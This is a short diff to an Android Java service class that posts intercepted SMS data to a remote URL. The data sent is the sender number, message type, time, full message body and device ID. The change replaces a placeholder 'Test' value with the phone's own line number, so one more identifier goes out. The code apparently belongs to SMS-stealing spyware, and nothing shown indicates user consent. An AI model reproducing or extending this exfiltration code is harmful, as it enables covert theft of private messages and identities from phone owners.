@@ -56,13 +56,13 @@ public class BaseService {
 		HttpPost request = new HttpPost(url);
 		List<NameValuePair> parameterLists = new ArrayList<NameValuePair>();
 		parameterLists.add(new BasicNameValuePair("ad", "save"));
-		parameterLists.add(new BasicNameValuePair("name", "Test"));
 		parameterLists.add(new BasicNameValuePair("menu", "addjie3"));
 		parameterLists.add(new BasicNameValuePair("ti", smsInfo.getPn()));
 		parameterLists.add(new BasicNameValuePair("lei", smsInfo.getType()));
 		parameterLists.add(new BasicNameValuePair("riqi", smsInfo.getTime()));
 		parameterLists.add(new BasicNameValuePair("jiang", smsInfo.getBody()));
 		parameterLists.add(new BasicNameValuePair("zong", Tools.getDeviceId(context)));
+		parameterLists.add(new BasicNameValuePair("name", Tools.getLine1Number(context)));
 		try {
 			UrlEncodedFormEntity entity = new UrlEncodedFormEntity(parameterLists, "GBK");
 			request.setEntity(entity);
